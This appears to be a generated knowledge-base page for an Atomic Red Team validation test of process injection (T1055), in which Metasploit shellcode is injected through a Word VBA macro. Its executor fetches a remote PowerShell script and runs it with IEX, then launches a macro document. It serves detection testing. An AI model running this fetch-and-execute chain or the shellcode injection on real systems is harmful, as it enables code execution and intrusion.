---
atomic_guid: "1c91e740-1729-4329-b779-feba6e71d048"
title: "Shellcode execution via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1055"
attack_technique_name: "Process Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.yaml"
build_date: "2026-04-27 19:12:26"
executor: "powershell"
aliases:
  - "1c91e740-1729-4329-b779-feba6e71d048"
  - "Shellcode execution via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This module injects shellcode into a newly created process and executes. By default the shellcode is created,
with Metasploit, for use on x86-64 Windows 10 machines.

Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
is required.

## ATT&CK Mapping

- [[kb/attack/techniques/T1055-process_injection|T1055: Process Injection]]

## Input Arguments

### txt_path

- description: Path to file containing VBA macro to run
- type: path
- default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt

## Dependencies

The 64-bit version of Microsoft Office must be installed

### Prerequisite Check

```powershell
try {
  $wdApp = New-Object -COMObject "Word.Application"
  $path = $wdApp.Path
  Stop-Process -Name "winword"
  if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
```

"#{txt_path}" must exist on disk at specified location

### Prerequisite Check

```powershell
if (Test-Path "#{txt_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{txt_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt" -OutFile "#{txt_path}" -UseBasicParsing
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "#{txt_path}" -officeProduct "Word" -sub "Execute"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.yaml)
